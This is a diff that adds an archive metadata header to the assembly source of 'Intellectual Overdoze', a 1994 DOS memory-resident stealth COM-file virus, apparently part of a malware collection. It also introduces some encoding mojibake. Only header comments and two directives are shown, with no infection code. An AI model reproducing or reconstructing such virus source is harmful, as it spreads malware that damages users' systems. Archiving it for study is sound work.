@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      I
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ; ------------------------------------------------------------------------------
 ;
 ;                       - Intellectual Overdoze -
@@ -5,7 +16,7 @@
 ;              (c) 1994 The Unforgiven/Immortal Riot 
 ;
 ;-------------------------------------------------------------------------------
-;          þ Memory Resident Stealth Infector of COM-programs þ
+;          ï¿½ Memory Resident Stealth Infector of COM-programs ï¿½
 ;-------------------------------------------------------------------------------
 	.model  tiny
 	.code
